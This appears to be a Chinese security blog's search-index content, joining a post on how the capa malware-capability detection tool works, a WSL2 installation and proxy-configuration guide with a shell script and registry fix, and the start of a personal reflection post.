┍━━━━━━━━━━━━━━━━━━━━━━━━┯━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┑ │ ATT\u0026CK Tactic │ ATT\u0026CK Technique │ ┝━━━━━━━━━━━━━━━━━━━━━━━━┿━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┥ │ DEFENSE EVASION │ File and Directory Permissions Modification T1222 │ │ │ Modify Registry T1112 │ │ │ Obfuscated Files or Information T1027 │ │ │ Virtualization/Sandbox Evasion::System Checks T1497.001 │ ├────────────────────────┼────────────────────────────────────────────────────────────────────────────────────┤ │ DISCOVERY │ File and Directory Discovery T1083 │ │ │ Process Discovery T1057 │ │ │ Query Registry T1012 │ │ │ System Information Discovery T1082 │ │ │ System Service Discovery T1007 │ ├────────────────────────┼────────────────────────────────────────────────────────────────────────────────────┤ │ EXECUTION │ Shared Modules T1129 │ │ │ System Services::Service Execution T1569.002 │ ├────────────────────────┼────────────────────────────────────────────────────────────────────────────────────┤ │ PERSISTENCE │ Create or Modify System Process::Windows Service T1543.003 │ ├────────────────────────┼────────────────────────────────────────────────────────────────────────────────────┤ │ PRIVILEGE ESCALATION │ Access Token Manipulation T1134 │ ┕━━━━━━━━━━━━━━━━━━━━━━━━┷━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┙ ┍━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┯━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┑ │ MBC Objective │ MBC Behavior │ ┝━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┿━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┥ │ ANTI-BEHAVIORAL ANALYSIS │ Virtual Machine Detection [B0009] │ ├─────────────────────────────┼───────────────────────────────────────────────────────────────────────────────┤ │ COMMAND AND CONTROL │ C2 Communication::Receive Data [B0030.002] │ │ │ C2 Communication::Send Data [B0030.001] │ ├─────────────────────────────┼───────────────────────────────────────────────────────────────────────────────┤ │ COMMUNICATION │ DNS Communication::Resolve [C0011.001] │ │ │ Socket Communication::Create TCP Socket [C0001.011] │ │ │ Socket Communication::Initialize Winsock Library [C0001.009] │ │ │ Socket Communication::Receive Data [C0001.006] │ │ │ Socket Communication::Send Data [C0001.007] │ ├─────────────────────────────┼───────────────────────────────────────────────────────────────────────────────┤ │ DATA │ Checksum::CRC32 [C0032.001] │ │ │ Encode Data::XOR [C0026.002] │ ├─────────────────────────────┼───────────────────────────────────────────────────────────────────────────────┤ │ DEFENSE EVASION │ Obfuscated Files or Information::Encoding-Standard Algorithm [E1027.m02] │ ├─────────────────────────────┼───────────────────────────────────────────────────────────────────────────────┤ │ DISCOVERY │ File and Directory Discovery [E1083] │ │ │ System Information Discovery [E1082] │ ├─────────────────────────────┼─────────────────────────────────────────────────────","date":"2023-09-02","objectID":"/2023/09/capa_thins_01/:1:0","tags":["ThreatHunting"],"title":"capa things 01","uri":"/2023/09/capa_thins_01/"},{"categories":["ThreatHunting"],"content":"安装方式 capa目前有3三种使用方式，一种是直接使用github的release，另外还可以作为库或者第三方集成工具使用，详细参考capa installation。 ","date":"2023-09-02","objectID":"/2023/09/capa_thins_01/:1:1","tags":["ThreatHunting"],"title":"capa things 01","uri":"/2023/09/capa_thins_01/"},{"categories":["ThreatHunting"],"content":"检测规则 capa自带了一些内置检测规则，github地址为capa-rules规则地址。此外，capa还支持并鼓励添加自定义规则，这样就可以实现高度定制化。例如： ","date":"2023-09-02","objectID":"/2023/09/capa_thins_01/:1:2","tags":["ThreatHunting"],"title":"capa things 01","uri":"/2023/09/capa_thins_01/"},{"categories":["ThreatHunting"],"content":"测试集 capa提供了一些capa-testfiles，测试数据说明如下： File name MD5 or SHA256 hash, all lower case, e.g. d41d8cd98f00b204e9800998ecf8427e e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855 Descriptive name, e.g. kernel32 Practical Malware Analysis Lab 01-01 File extension .exe_ .dll_ .sys_ .elf_ .raw32 (32-bit shellcode) .raw64 (64-bit shellcode) .cs_ (C# source code) .aspx_ (ASP.NET source code) .py_ (Python source code) Directories /: native test binaries /dotnet: .NET test binaries /sigs: test signatures /source: source language test files e.g. C# and Python ","date":"2023-09-02","objectID":"/2023/09/capa_thins_01/:1:3","tags":["ThreatHunting"],"title":"capa things 01","uri":"/2023/09/capa_thins_01/"},{"categories":["ThreatHunting"],"content":"2. Capa原理详解 首先给出Mandiant关于该工具的第一篇blog-capa: Automatically Identify Malware Capabilities。 ","date":"2023-09-02","objectID":"/2023/09/capa_thins_01/:2:0","tags":["ThreatHunting"],"title":"capa things 01","uri":"/2023/09/capa_thins_01/"},{"categories":["ThreatHunting"],"content":"1. 工具背景 在分析程序是否为恶意、程序在攻击期间所扮演的角色、潜在的功能和攻击者的意图时，通常需要经验丰富的恶意软件分析师来完成。他们可以快速对未知二进制文件进行分类以获取初步了解并进一步深入分析。然而，这绝大程度上取决于恶意软件分析师的个人能力和专家经验，对于能力或者经验不足的分析师很难区分正常和恶意样本，并且字符串、floss或者pe检测工具显示的细节一般比较底层，比较难统计样本的宏观行为特征。 ","date":"2023-09-02","objectID":"/2023/09/capa_thins_01/:2:1","tags":["ThreatHunting"],"title":"capa things 01","uri":"/2023/09/capa_thins_01/"},{"categories":["ThreatHunting"],"content":"2. 恶意软件分类 这里以某个恶意软件为例，下图展示了文件的字符串和导入表信息，通过这些信息，恶意软件分析师利用字符串和导入表中的特殊API会猜测程序的功能。 该程序会创建互斥锁、启动进程、网络通信（IP地址为127.26.152.13） Winsock(WS2_32)导入会猜测网络功能，但是没有函数名，可能是按照序号导入。 通过动态分析可以进一步了解程序的其他功能，而动态分析通常依赖与沙箱。沙箱报告或者动态分析工具仅限于从执行代码路径中捕获行为，例如连接命令和控制(C2)服务器后触发的功能。一般情况下，我们不建议使用实时互联网连接来分析恶意软件。因此，需要对它进行逆向。如下所示，利用IDA对程序的主要功能进行反编译： 我们可以发现样本具备如下功能； 创建互斥锁以确保只有一个实例在运行 创建一个TCP socket 连接IP地址127.26.152.13，端口为80 发送和接收数据 将收到的数据和“sleep”和“exec”命令字符串进行对比 创建新进程 尽管并不是每个code path都会在每次运行时执行到，但是我们可以判断该样本具有执行这些行为的能力。此外，通过结合各个结论，可以推断该样本是一个后门，可以运行由硬编码的C2 server指定的任意程序。 ","date":"2023-09-02","objectID":"/2023/09/capa_thins_01/:2:2","tags":["ThreatHunting"],"title":"capa things 01","uri":"/2023/09/capa_thins_01/"},{"categories":["ThreatHunting"],"content":"3. 自动识别能力 在实际的生产环境中，恶意软件的分析并不会这么简单，意图识别需要通过包含数百或数千个函数的二进制文件进行传播。此外，逆向水平的高低决定了我们对样本分析的深度。 capa提供的思路是将人工的判断逻辑自动化到工具中，例如API调用、字符串、敞亮和其他功能的重复模式中识别程序中的功能，提供了一种通用且灵活的方式来编纂专业知识，也就是说把专家经验落地到自动化工具中。在运行capa时，它会将特征和模式识别为自动化的人工步骤，从而产生可以推动后续调查步骤的高级结论。例如，capa识别出未加密的http通信功能，那么我们就可以到代理日志或者其他网路跟踪数据中进一步筛查。 ","date":"2023-09-02","objectID":"/2023/09/capa_thins_01/:2:3","tags":["ThreatHunting"],"title":"capa things 01","uri":"/2023/09/capa_thins_01/"},{"categories":["ThreatHunting"],"content":"4. capa的能力 下面的输出会展示此实例中所有已识别的样本功能： 左侧的每个条目描述一个功能类别 右侧的关联namespace有助于对相关功能进行分组 下面的图则显示了capa对“create TCP socket”的具体输出，通过这个信息我们可以检查二进制文件相关特征的具体位置，此外，还可以利用语法规则推测它们低级功能的逻辑树组成。 ","date":"2023-09-02","objectID":"/2023/09/capa_thins_01/:2:4","tags":["ThreatHunting"],"title":"capa things 01","uri":"/2023/09/capa_thins_01/"},{"categories":["ThreatHunting"],"content":"5. 工作原理 capa包含两个核心组件，通过算法对未知程序进行分类。 代码分析引擎从文件中提取特征，例如字符串、反汇编和控制流 逻辑分析引擎查找符合通用规则格式的特征组合。当找到匹配项时，capa会报告规则描述的功能。 特征提取 代码分析引擎会从程序中提取低级特征，所有的特征与人工可能识别的特征一样，例如字符串或者数字，并且capa可以解释这些数据。这些功能通常为两大类：文件功能和反汇编功能。 文件特征是从原始文件数据及其结构中提取的，例如PE文件头、字符串、导入表、导出的函数和节名称。 反汇编特征是从文件的高级静态分析中提取的，这会进行反汇编和重建控制流。下图显示了选定的反汇编功能，包括API调用、指令助记符、数字和字符串的引用。 capa在设计时考虑了灵活且可扩展的特征提取，这使得capa可以轻松地集成在其他的代码分析后端。目前，capa 独立版本依赖于vivisect分析框架。如果使用 IDA Pro，还可以使用 IDAPython 后端运行 capa。请注意，有时代码分析引擎之间的差异可能会导致不同的功能集，从而导致不同的结果。幸运的是，这在实践中通常不是一个严重的问题。 能力规则 capa 规则使用特征的结构化组合来描述可以在程序中实现的功能。如果所有必需的功能都存在，capa 就会断定该程序包含该功能。 capa 规则是包含元数据和表达其逻辑的语句树的 YAML 文档。除此之外，规则语言还支持逻辑运算符和计数。在下图中，“create TCP socket”规则规定数字 6、1 和 2 以及对API 函数套接字或WSASocket的调用必须出现在单个基本块的范围内。基本块将汇编代码分组在非常低的级别，这使得它们成为匹配紧密相关的代码段的理想位置。除了基本块之外，capa还支持函数和文件级别的匹配。函数作用域将反汇编函数中的所有功能联系在一起，而文件作用域包含整个文件中的所有功能。 下图突出显示了规则元数据，该元数据使cap 能够向用户显示高级、有意义的结果。规则名称描述了所识别的功能，而命名空间将其与技术或分析类别相关联。我们已经在capa输出的功能表中看到了名称和命名空间。元数据部分还可以包括作者或示例等字段。我们使用示例来引用我们知道存在功能的文件和偏移量，从而能够对每个规则进行单元测试和验证。此外，capa 规则可以作为现实恶意软件中行为的重要文档，因此请随意保留一份副本作为参考。在以后的文章中，我们将讨论其他元信息，包括 capa 对 ATT\u0026CK 和恶意软件行为目录框架的支持。 ","date":"2023-09-02","objectID":"/2023/09/capa_thins_01/:2:5","tags":["ThreatHunting"],"title":"capa things 01","uri":"/2023/09/capa_thins_01/"},{"categories":["Misc"],"content":"日常","date":"2022-11-23","objectID":"/2022/11/wsl2%E7%9A%84%E5%B0%8F%E6%8A%98%E8%85%BE/","tags":["Misc"],"title":"WSL2的小折腾","uri":"/2022/11/wsl2%E7%9A%84%E5%B0%8F%E6%8A%98%E8%85%BE/"},{"categories":["Misc"],"content":"瞎折腾了一下WSL2，真的很香啊～ ","date":"2022-11-23","objectID":"/2022/11/wsl2%E7%9A%84%E5%B0%8F%E6%8A%98%E8%85%BE/:0:0","tags":["Misc"],"title":"WSL2的小折腾","uri":"/2022/11/wsl2%E7%9A%84%E5%B0%8F%E6%8A%98%E8%85%BE/"},{"categories":["Misc"],"content":"TL;DR 缘由可能谁都想不到，我在吃饭的时候刷手机，看到一个今年 DefCON上LiveCTF的视频，发现 perfect r※※※t 在解题的时候用的是wsl。其实这东西很早之前我试过，但是当时出于没有图形化界面和文件copy等操作的不方面的考虑（其实最主要是看到很多评论说有bug，我是图稳定，不是为了去解决各种bug），没有深入去使用，只是安装完，体验了一下，官方文档都没看的那种体验，就卸载了。但是，我看视频的时候，发现 perfect r※※※t 居然可以直接在WSL里启动Windows上的IDA。这把我惊艳到了！（没有去看这个功能什么时候出现的，但是就是一见钟情的感觉~）这样的话，我可以直接在WSL里把题目下载下来，然后直接在命令行把IDA拉起来，写exp的话可以直接在命令行把code拉起来，也就是说，不管是基于Linux还是Windows的操作，都可以直接在WSL里完成，完全不需要去手动找软件、拖文件这些操作，简直丝滑~于是，开始折腾。 ","date":"2022-11-23","objectID":"/2022/11/wsl2%E7%9A%84%E5%B0%8F%E6%8A%98%E8%85%BE/:1:0","tags":["Misc"],"title":"WSL2的小折腾","uri":"/2022/11/wsl2%E7%9A%84%E5%B0%8F%E6%8A%98%E8%85%BE/"},{"categories":["Misc"],"content":"WSL2 不太重要的简介 首先给出Microsoft的官方文档，强烈建议直接看官方的原版英文文档。基本上后续遇到的问题，在这里都会有对应的解答，不是全部，是大部分。 这里贴一部分，不想去看官方文档的听我给你白话白话吧： WSL，全称“Windows Subsystem for Linux”，就是Windows下的Linux子系统，它是微软为开发者在Windows上开发的一个GNU/Linux环境，包括常规的命令行工具、基础设置和应用。有了它，你不需要再安装虚拟机，可以直接通过Windows去到一个Linux环境中，低耗能、高效率。 在WSL中，你可以进行的操作： 直接通过Microsoft Store安装GNU/Linux的发行版本； 运行常规的命令行工具，例如 grep, sed, awk 和其他的 ELF-64 二进制程序； 运行 Bash shell scripts和GNU/Linux命令行工具，包括： Tools: vim, emacs, tmux Languages: NodeJS, Javascript, Python, Ruby, C/C++, C# \u0026 F#, Rust, Go, etc. Services: SSHD, MySQL, Apache, lighttpd, MongoDB, PostgreSQL. 使用你安装的GNU/Linux发行版的包管理工具安装软件； 使用 Unix-like 命令行 shell 调用 Windows 应用程序； 在 Windows 上调用 GNU/Linux 应用程序； 直接在Windows的桌面环境中运行GNU/Linux图形化程序； 使用GUP加速进行机器学习、数据分析和其他的高性能计算场景。 基本上就是一个“加强版”的Linux，加强的点在于打通了虚拟环境中的Linux与物理环境的Windows的沟通和联系，不仅仅是软件层面，甚至是到达了硬件层面，可以直接使用GPU的算力。我对虚拟化不太熟悉，不知道常规的VMWare和Virtual Box这种软件是否也能实现这种效果。 WSL1还是WSL2？ 这里比较推荐首先看下What is the Windows Subsystem for Linux (WSL)?、What’s new with WSL 2?、Comparing WSL 1 and WSL 2这三部分的内容，至少你要懂得你正在鼓捣的是什么东西。而且，WSL是有两个版本的，我们作为用户先不管内部变化，最直观的不同是安装方式和步骤的不一样。非要对比feature的话，这里给个直观图： 看了这个图之后，我果断选择了WSL2，毕竟 Full Linux Kernel 的支持在那太耀眼了。但是需要注意的是，WSL2对Windows版本是有要求的，必须是 Windows 11 or Windows 10, Version 1903, Build 18362 or later。如果你的系统版本低于这个，我的个人建议是升级系统版本去使用WSL2，尽可能不再去使用WSL1（bug多，且修复率低到离谱。我一度怀疑是不是WSL1的bug到了不值得再修复而开发了WSL2）。 ","date":"2022-11-23","objectID":"/2022/11/wsl2%E7%9A%84%E5%B0%8F%E6%8A%98%E8%85%BE/:2:0","tags":["Misc"],"title":"WSL2的小折腾","uri":"/2022/11/wsl2%E7%9A%84%E5%B0%8F%E6%8A%98%E8%85%BE/"},{"categories":["Misc"],"content":"WSL2的安装和配置 ","date":"2022-11-23","objectID":"/2022/11/wsl2%E7%9A%84%E5%B0%8F%E6%8A%98%E8%85%BE/:3:0","tags":["Misc"],"title":"WSL2的小折腾","uri":"/2022/11/wsl2%E7%9A%84%E5%B0%8F%E6%8A%98%E8%85%BE/"},{"categories":["Misc"],"content":"Install 版本检查 ​ 首先系统版本要求Windows 10版本 2004 及更高版本（内部版本 19041 及更高版本）或 Windows 11，我还是比较建议大家升级Windows 11的，目前为止还没有发现让我忍受不了的Bug。 启用虚拟功能和虚拟机平台功能 可以先查看一下自己是否已经开启了虚拟化支持：任务管理器-\u003e性能 然后开启适用于Linux的Windows子系统功能，有两种方式，第一种是管理员启动PowerShell，执行： dism.exe /online /enable-feature /featurename:Microsoft-Windows-Subsystem-Linux /all /norestart，另外一种是通过GUI来开启，控制面板 -\u003e 程序和功能 -\u003e 启用或关闭Windows功能 ： ​ 然后启用虚拟机平台功能：dism.exe /online /enable-feature /featurename:VirtualMachinePlatform /all /norestart，GUI的在上面已经点上了。 更新 Linux 内核： 这一步是一定要做的，避免出现各种奇奇怪怪的问题（别问我怎么知道的-。-）：wsl --update。这里在更新完内核之后，最好是重启一下系统，避免在后面安装发行版的时候出问题。 设置WSL2为默认版本： 这一步问题不大，毕竟使用WSL2默认也会是2版本，但是为了保险，还是设置一下，毕竟在一些情况下是可以跳转到1版本的：wsl --set-default-version 2 ","date":"2022-11-23","objectID":"/2022/11/wsl2%E7%9A%84%E5%B0%8F%E6%8A%98%E8%85%BE/:3:1","tags":["Misc"],"title":"WSL2的小折腾","uri":"/2022/11/wsl2%E7%9A%84%E5%B0%8F%E6%8A%98%E8%85%BE/"},{"categories":["Misc"],"content":"Setting 发行版我这里选择的是Ubuntu，用习惯了，而且选的是22.04版本，因为我的一些项目需要使用的Python版本要求较高，需要是3.10。 踩坑： 这里我本来是上的20.04版本的Ubuntu，它的默认Python版本是3.8，然后在跑项目的时候出现了问题。我就想着再弄个多Python环境，虽然设置默认Python版本是新下载的3.10，但是在apt install的时候还是会用系统的Python。但是，我又不想更改系统全局Python版本（鬼知道会出现什么问题-。-）。 在安装pip的时候，也是使用的系统版本Python，所以下载下来的pip都是基于3.8的。所以我就用get-pip.py去安装3.10的pip，但是遇到了网速问题，根本下载不下来，上了代理也是不管用，不知道为什么。 被网络问题搞烦了之后，我就决定换最新的22版本了。一开始主要是担心可能会存在适配问题不稳定，所以先上了使用最多的20版本，但是现在实在是不想去解决20版本上的Python环境问题了。好吧，我承认我懒了~ 直接在 Microsoft Store 搜索 Ubuntu，选择22版本下载即可。如果你的地区在CN，退掉你的代理，网速会快一些。 下载安装完成后，在开始菜单和应用程序列表中也会出现新增的Ubuntu 22.04： 点击启动，然后根据提示建立用户和设置密码，即可安装完成。 然后在 terminal 中查看安装情况： 进入到这个Ubuntu有两种方式，第一种是直接点击这个应用，会弹出一个shell： 这种我不喜欢，所以我选择直接在 Terminal 中直接输入 ubuntu2204.exe 来启动（只打ubuntu即可，会自动补全）： 退出的话可以直接 exit 是注销登录，但是系统还是在后台执行的。可以用 wsl --shutdown 来关掉后台运行的Ubuntu。（shutdown会将所有的发行都关掉-。-也就是说，如果你跑了两个Ubuntu，两个都会被关机。）关掉单个发行可以用 wsl --terminate \u003cdistro\u003e 这种命令，就只会关掉你指定的发行版本了。 ","date":"2022-11-23","objectID":"/2022/11/wsl2%E7%9A%84%E5%B0%8F%E6%8A%98%E8%85%BE/:3:2","tags":["Misc"],"title":"WSL2的小折腾","uri":"/2022/11/wsl2%E7%9A%84%E5%B0%8F%E6%8A%98%E8%85%BE/"},{"categories":["Misc"],"content":"Ubuntu的优化和配置 ","date":"2022-11-23","objectID":"/2022/11/wsl2%E7%9A%84%E5%B0%8F%E6%8A%98%E8%85%BE/:4:0","tags":["Misc"],"title":"WSL2的小折腾","uri":"/2022/11/wsl2%E7%9A%84%E5%B0%8F%E6%8A%98%E8%85%BE/"},{"categories":["Misc"],"content":"1. 常规Ubuntu配置 进来之后，可以进行常规的Ubuntu的配置。 在安装之前，搜了一些关于qemu的问题，但是我这里在安装的时候直接apt安装的，没有什么问题。也可以正常使用，估计是WSL2版本升级已经解决了网上存在的一些Bug。（如果是用WSL1的话，你还要额外配置qemu-kvm等很多东西，反正我是嫌麻烦。） ","date":"2022-11-23","objectID":"/2022/11/wsl2%E7%9A%84%E5%B0%8F%E6%8A%98%E8%85%BE/:4:1","tags":["Misc"],"title":"WSL2的小折腾","uri":"/2022/11/wsl2%E7%9A%84%E5%B0%8F%E6%8A%98%E8%85%BE/"},{"categories":["Misc"],"content":"2. 与Windows交互 1. 文件共享 WSL里面会自动将Windows的文件盘挂在到/mnt目录下，所以可以在/mnt目录下看到Windows的各个盘的文件，这是默认配置，不需要设置。此外，在Windows的文件资源管理器里，在左边的目录的最下面会有一个 Linux ，里面就是WSL安装的发行版本的文件系统。 所以你把要分析的文件放在什么位置都没有关系，两个系统都可以很方便地去访问到。 2. 应用调用 WSL可以直接调用Windows的应用程序，这是因为WSL默认会把Windows的环境变量也包含进来： 但是这样很多人不喜欢，因为系统隔离性很差，在执行命令的时候，不太容易区分，很容易在Linux中把Windows的工具给拉起来： 去掉Windows环境变量也比较简单，在 wsl 下新建 /etc/wsl.conf 配置文件，并编辑如下内容： [interop] appendWindowsPath = false 然后重启 WSL 即可。 但是我个人感觉把，为了只在命令行工作，我是保留了Windows的环境变量的，因为这样我全程都可以在WSL中工作，不需要来回切换环境。尤其是对于开发来说，其实可以设置一个环境变量，在两个系统中通用。这本来是WSL的一个亮点，应该好好加以利用。 如果你实在忍受不了这么多的环境变量，就在 PATH 后面单独加上工具的路径，就是/mnt开头，就像上面的图里的最后两个。 3. 网络代理 WSL配置代理也比较方便，但是网上的一些教程存在问题，所以需要实践一下。 代理，无非就是设置http、https、socks的转发嘛，但是对于WSL来说，有几个点需要注意一下： 首先，要确保你的代理软件是开了LAN的代理功能的，这样才能转到WSL那边去： 然后，代理的IP地址不是写WSL自身的IP地址，而是写网关地址，也就是Windows中的WSL地址： 最后，就是常规的 export 命令了，这里给出一个脚本： ✨🌊 v4ler1an ~ ➜ cat proxy.sh #!/bin/sh hostip=$(cat /etc/resolv.conf | grep nameserver | awk '{ print $2 }') wslip=$(hostname -I | awk '{print $1}') port=7890 PROXY_HTTP=\"http://${hostip}:${port}\" set_proxy(){ export http_proxy=\"${PROXY_HTTP}\" export HTTP_PROXY=\"${PROXY_HTTP}\" export https_proxy=\"${PROXY_HTTP}\" export HTTPS_proxy=\"${PROXY_HTTP}\" export ALL_PROXY=\"${PROXY_SOCKS5}\" export all_proxy=${PROXY_SOCKS5} git config --global http.https://github.com.proxy ${PROXY_HTTP} git config --global https.https://github.com.proxy ${PROXY_HTTP} echo \"[+] Proxy has been opened.\" echo \"[+] Git uses proxy too.\" } unset_proxy(){ unset http_proxy unset HTTP_PROXY unset https_proxy unset HTTPS_PROXY unset ALL_PROXY unset all_proxy git config --global --unset http.https://github.com.proxy git config --global --unset https.https://github.com.proxy echo \"[+] Proxy has been closed.\" echo \"[+] Git setting has been cleaned.\" } test_setting(){ echo \"[+] Host IP: \" ${hostip} echo \"[+] WSL IP: \" ${wslip} echo \"[+] Try to connect to Google...\" resp=$(curl -I -s --connect-timeout 5 -m 5 -w \"%{http_code}\" -o /dev/null www.google.com) if [ ${resp} = 200 ]; then echo \"[+] Proxy setup succeeded!\" else echo \"[+] Proxy setup failed!\" fi } if [ \"$1\" = \"set\" ] then set_proxy elif [ \"$1\" = \"unset\" ] then unset_proxy elif [ \"$1\" = \"test\" ] then test_setting else echo \"[+] Unsupported arguments.\" fi 然后再设置一下alias就可以了： alias proxy='source ~/proxy.sh set' alias unproxy='source ~/proxy.sh unset' alias ptest='source ~/proxy.sh test' ","date":"2022-11-23","objectID":"/2022/11/wsl2%E7%9A%84%E5%B0%8F%E6%8A%98%E8%85%BE/:4:2","tags":["Misc"],"title":"WSL2的小折腾","uri":"/2022/11/wsl2%E7%9A%84%E5%B0%8F%E6%8A%98%E8%85%BE/"},{"categories":["Misc"],"content":"WSL2踩坑 ","date":"2022-11-23","objectID":"/2022/11/wsl2%E7%9A%84%E5%B0%8F%E6%8A%98%E8%85%BE/:5:0","tags":["Misc"],"title":"WSL2的小折腾","uri":"/2022/11/wsl2%E7%9A%84%E5%B0%8F%E6%8A%98%E8%85%BE/"},{"categories":["Misc"],"content":"1. 参考的对象类型不支持尝试的操作 对应的英文信息是：The attempted operation is not supported for the type of object referenced.，有很大可能在第一次运行安装的Linux的时候就出现这个问题，不解决的话用户创建不了，系统进不去。 Solution 之前从来没有遇到过这种问题，Microsoft 官方文档也没有看到对应的问题和 Solution，后来去看了WSL的issue，发现了一个相关的issue，发现这个问题是跟VPN有关。 如果你的电脑上安装了VPN软件，可能会修改主机操作系统的VPN相关的设置，这个时候可能会出现这个问题，解决方案也比较简单，有两种方式，一种是临时的：执行一下 netsh winsock reset 就可以解决这个问题，但是有可能在重启系统后就失效；一种是非临时的，需要在注册表新增一个项，这种在重启主机系统后还会有效： Windows Registry Editor Version 5.00 [HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\WinSock2\\Parameters\\AppId_Catalog\\0408F7A3] \"AppFullPath\"=\"C:\\\\\\\\windows\\\\\\\\system32\\\\\\\\wsl.exe\" \"PermittedLspCategories\"=dword:80000000 把上面的内容保存成一个 reg 文件，然后管理员运行即可新增对应注册表项。 这个问题从Windows 10的时候就存在，但是直到Windows 11的最新版本，还没有解决。虽然网上有了经过验证的有效的解决方案，但是微软官方始终没有解决这个问题。我感觉WSL的开发者应该是有心无力，毕竟WSL的定位应该还只是一个应用级别的软件，而不像Windows系统中VPN组件这么核心。因为目前这个问题的出现大概率跟VPN模块有关，如果要修复，很有可能会涉及到VPN模块和网络模块，那就不是WSL的开发者自己能搞得定的了。 对了，解决方案里还有一个什么工具可以解决这个问题，但是我个人还是建议能不用工具就不用工具，直接写个注册表也不是很麻烦。 ","date":"2022-11-23","objectID":"/2022/11/wsl2%E7%9A%84%E5%B0%8F%E6%8A%98%E8%85%BE/:5:1","tags":["Misc"],"title":"WSL2的小折腾","uri":"/2022/11/wsl2%E7%9A%84%E5%B0%8F%E6%8A%98%E8%85%BE/"},{"categories":["Misc"],"content":"2. pip安装超时 前面有说我是安装过20版本的Ubuntu的，当时想装一个python 3.10和对应的pip，但是遇到了pip安装不上的问题，其实命令很简单： curl https://bootstrap.pypa.io/get-pip.py -o get-pip.py python3 get-pip.py 但是在执行后面的py文件的时候，首先是网络连接慢，可以理解，毕竟pypi他们之前就出现过网络问题，所以这个时候最好是开代理。然后，我使用sudo命令去执行了第二个命令，发现还是么有网速，死活下载不下来那个2.1M的文件。最后，去掉了sudo，秒安装-。-。这个怪我自己。然后，在更新的时候： python3 -m pip install --upgrade pip 这个时候我已经设置了默认python为新装的python3.10，又遇到了网络问题，更新不了，开代理也没有用。 最后，妥协了，用的国内的源-。-： python3 -m pip install --upgrade pip -i http://mirrors.aliyun.com/pypi/simple/ 到这里基本解决了python3.10和pip的问题，但是在后面安装我的那个工具的时候，发现它还是会默认使用系统的python3.8，而且在apt的时候，下载的也是python3.8的依赖。这个时候我已经心态爆炸，懒得去弄了，所以后面换了22版本的Ubuntu。 其实python多版本的问题直接用pyenv就可以解决，但就是头铁，不想装这么多乱七八糟的东西，奔着死活不用就想去解决问题的态度，我换了系统版本。 ","date":"2022-11-23","objectID":"/2022/11/wsl2%E7%9A%84%E5%B0%8F%E6%8A%98%E8%85%BE/:5:2","tags":["Misc"],"title":"WSL2的小折腾","uri":"/2022/11/wsl2%E7%9A%84%E5%B0%8F%E6%8A%98%E8%85%BE/"},{"categories":["Life"],"content":"日常","date":"2022-11-19","objectID":"/2022/11/%E5%85%B3%E4%BA%8E%E6%88%91%E5%9C%A8%E8%BF%99%E4%B8%AA%E5%91%A8%E6%9C%AB%E6%97%A9%E4%B8%8A%E7%9D%A1%E4%B8%8D%E7%9D%80%E8%B5%B7%E6%9D%A5%E6%83%B3%E7%9A%84%E8%BF%99%E4%BA%9B%E4%BA%8B/","tags":["Life"],"title":"关于我在这个周末早上睡不着起来想的这些事","uri":"/2022/11/%E5%85%B3%E4%BA%8E%E6%88%91%E5%9C%A8%E8%BF%99%E4%B8%AA%E5%91%A8%E6%9C%AB%E6%97%A9%E4%B8%8A%E7%9D%A1%E4%B8%8D%E7%9D%80%E8%B5%B7%E6%9D%A5%E6%83%B3%E7%9A%84%E8%BF%99%E4%BA%9B%E4%BA%8B/"},{"categories":["Life"],"content":"瞎聊，共勉，没有主题。 关于我在这个周末早上睡不着起来想的这些事 ","date":"2022-11-19","objectID":"/2022/11/%E5%85%B3%E4%BA%8E%E6%88%91%E5%9C%A8%E8%BF%99%E4%B8%AA%E5%91%A8%E6%9C%AB%E6%97%A9%E4%B8%8A%E7%9D%A1%E4%B8%8D%E7%9D%80%E8%B5%B7%E6%9D%A5%E6%83%B3%E7%9A%84%E8%BF%99%E4%BA%9B%E4%BA%8B/:0:0","tags":["Life"],"title":"关于我在这个周末早上睡不着起来想的这些事","uri":"/2022/11/%E5%85%B3%E4%BA%8E%E6%88%91%E5%9C%A8%E8%BF%99%E4%B8%AA%E5%91%A8%E6%9C%AB%E6%97%A9%E4%B8%8A%E7%9D%A1%E4%B8%8D%E7%9D%80%E8%B5%B7%E6%9D%A5%E6%83%B3%E7%9A%84%E8%BF%99%E4%BA%9B%E4%BA%8B/"},{"categories":["Life"],"content":"仅供参考 之前有在B站上简单录制过几个视频，当时主要是给我母校和实验室的学弟学妹们看的，结果他们又给自己的朋友说了，然后问我的人就多了起来，所以后来又出了视频。 其实每次录完视频，我都觉得没有意义。从我的角度来看，我能给大家提供的信息是我所看到的关于行业的一小部分的状况以及我的一些学习经历。但是我是属于比较传统的科班出身，而且本科没有接触，是在研究生阶段接触到。所以我的一些学习路径和方法可能与大部分的本科生不太一样，更不要说对于那些从高中就开始接触安全的了。 我不是很喜欢给别人建议的，就像Deft说的，每个人要不要做一件事，其实是不太需要别人的建议的，因为每个人的经历不同，没有办法去感同身受。但是呢，当别人咨询你，你不答复点什么的话，又会被别人误解成你不想答、藏着掖着、小家子气、装清高什么的。我觉得我已经算是比较不在意别人看法的那种类型了，但是有人的地方就有江湖嘛，江湖是什么？人情世故啊，不得不低头。所以，就索性录了视频去统一答复。 最狗血的是，我视频里已经反复强调了每个人的情况不同，要结合具体实际，还是有人过来yygq你，觉得你出来zb，我真是服了:)不过这种倒是无所谓，我对这一类的信息基本不care，对我造不成什么影响。 